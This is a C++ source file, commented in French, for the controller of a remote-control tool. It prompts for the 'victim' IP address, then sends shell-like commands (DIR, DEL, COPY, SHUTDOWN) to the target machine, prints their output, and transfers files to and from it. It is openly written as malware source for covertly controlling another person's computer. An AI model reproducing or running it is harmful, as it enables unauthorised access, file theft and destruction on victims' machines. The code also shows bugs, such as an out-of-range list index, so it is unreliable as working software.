#include "Client.h"

// *** Fonctions Publiques *** //

Client::Client()
{
	if (initialisationWSA()) { affichage("Intitialisation WSA reussi."); };
	if (intialisationAddrInfo(serveurIP(), PORT)) { affichage("Intitialisation AddrInfo reussi."); };
	if (connecterLeSocket()) { affichage("Connection du Socket reussi."); };
}

bool Client::connexion()
{
	erreur = connect(socketDeConnexion, resultat->ai_addr, (int)resultat->ai_addrlen);
	if (erreur == SOCKET_ERROR) {
		affichage(*new vector<string>{ "Erreur ",to_string(erreur).c_str()," lors de la connexion." });
		closesocket(socketDeConnexion);
		socketDeConnexion = INVALID_SOCKET;
	}

	if (socketDeConnexion == INVALID_SOCKET) {
		affichage("La connexion au serveur a echoue!");
		WSACleanup();
		return false;
	}

	affichage("Connection au Serveur reussi");
	this->t = new Transfert(&socketDeConnexion);
	return true;
}

string Client::commandes() {
	string in, cmd, chemin;
	do{
		bool b = true;
		chemin = t->recevoirMsg();
		while (b) {
			cout << chemin << ">> ";
			getline(cin, in);
			cmd = in.substr(0, in.find_first_of(' '));
			for_each(cmd.begin(), cmd.end(), [](char& c) {
				c = ::toupper(c);
				});
			if (!cmd.empty() && (
				cmd == "DIR" || cmd == "CD" || cmd == "MD" || cmd == "RD" || cmd == "DEL" ||
				cmd == "COPY" || cmd == "SHUTDOWN" || cmd == "FILE_TO_SERVER" || cmd == "FILE_TO_CLIENT" || cmd == "CLOSE"
				))
			{
				b = false;
				if (cmd == "CLOSE")
					t->envoyerMsg(in);
				else if (cmd == "FILE_TO_SERVER") {
					int i = 0;
					for (char c : in)
						if (c == ' ')
							i++;
					if (i == 2) {
						try {
							string s = in.substr(in.find_first_of(' ') + 1);
							s = s.substr(0, s.find_first_of(' '));
							path src = canonical(current_path() / s);
							if (src.has_filename())
							{
								t->envoyerMsg(in);
								if (t->recevoirMsg() == "ACK") // ACK
								{
									t->envoyerFichier(src.filename().string(), src.parent_path());
									ofstream f("out.txt", ios_base::app);
									afficherCommande("ACK");
									f.close();
									remove("out.txt");
								}
								else
									afficherCommande("ACK"); // RECEIVE ERROR OUTPUT
							}
							else
								affichage("La source n'a pas de nom de fichier");
						}
						catch (exception e) { affichage(e.what()); }
					}
					else {
						affichage("Il n'y a pas de destination");
						b = true;
					}
						
				}
				else if (cmd == "FILE_TO_CLIENT") {
					int i = 0;
					for (char c : in)
						if (c == ' ')
							i++;
					if (i == 2) {
						try {
							string s = in.substr(in.find_first_of(' ') + 1);
							s = s.substr(s.find_first_of(' ')+1);
							path wdest = weakly_canonical(current_path() / s);
							path dest = canonical(wdest.parent_path());
							if (wdest.has_filename())
							{
								t->envoyerMsg(in);
								if (t->recevoirMsg() == "ACK") // ACK
								{
									t->recevoirFichier(wdest.filename().string(), dest);
									ofstream f("out.txt", ios_base::app);
									afficherCommande("ACK");
									f.close();
									remove("out.txt");
								}
								else
									afficherCommande("ACK"); // RECEIVE ERROR OUTPUT
							}
							else
								affichage("La destination n'a pas de nom de fichier");
						}
						catch (exception e) { affichage(e.what()); }
					}
					else {
						affichage("Il n'y a pas de destination");
						b = true;
					}
				}
				else
					afficherCommande(in);
				
			}
			else
				affichage("Les commandes possibles sont DIR, CD, MD, RD, DEL, COPY, SHUTDOWN, FILE_TO_SERVER, FILE_TO_CLIENT");
		}
	} while (cmd != "CLOSE");

	return in;
}

bool Client::gestionDeFichier()
{
	do {
		affichage("Veuillez choisir une option:");
		affichage("0) Fermer la connection");
		affichage("1) Redemander la liste de fichiers disponibles");
		fichiers = t->recevoirListeFichiers();
		afficherFichiers();
	} while (menuGestionFichier());

	return true;
}

bool Client::fermerConnection()
{
	closesocket(this->socketDeConnexion);
	return true;
}

// *** Fonctions Protected *** //

// Main

bool Client::menuGestionFichier()
{
	int choix = -1;
	string entree;

	do {
		cout << "Choix: ";
		cin >> entree;
		for (unsigned int i = 0; i < entree.size(); i++) {
			if (isdigit(entree[i]) == false)
			{
				affichage("Mauvais choix. Veuillez reessayer.");
				break;
			}
			if (i == entree.size() - 1)
				choix = stoi(entree);
		}

		if (choix > fichiers.size() + 1)
			affichage("Mauvais choix. Veuillez reessayer.");

	} while (choix < 0 || choix > fichiers.size() + 1);

	switch (choix)
	{
	case 0:
		t->envoyerMsg("FIN");
		return false;

	case 1:
		t->envoyerMsg("LIST");
		affichage("\n");
		break;

	default:
		t->envoyerMsg(fichiers.at(choix - 2));
		if (t->recevoirFichier(fichiers.at(choix - 2), current_path() ))
			affichage("Transfert Reussi.");
		else {
			affichage("Le transfer a echoue.");
		}		
		affichage("\n");
	}

	return true;
}

string Client::serveurIP()
{
	string ip;
	int result;
	do {
		affichage("Quelle est l'addresse IP de la victime?");
		getline(cin, ip);
		struct sockaddr_in sa;
		result = inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr));
		if(result != 1)
			affichage("Entree non valide...");
	} while (result != 1);
	
	return ip;
}
// SUPPORT

void Client::afficherCommande(string in)
{
	t->envoyerMsg(in);
	t->recevoirFichier("out.txt", current_path());
	string getcontent;
	ifstream fichier("out.txt");
	while (getline(fichier, getcontent))
	{
		cout << getcontent << endl;
	}
	fichier.close();
	t->envoyerMsg("ACK");
	remove("out.txt");
}

void Client::afficherFichiers()
{
	for (int i = 2; i < fichiers.size() + 2; i++) 
		affichage(i + ") " + fichiers.at(i));
}
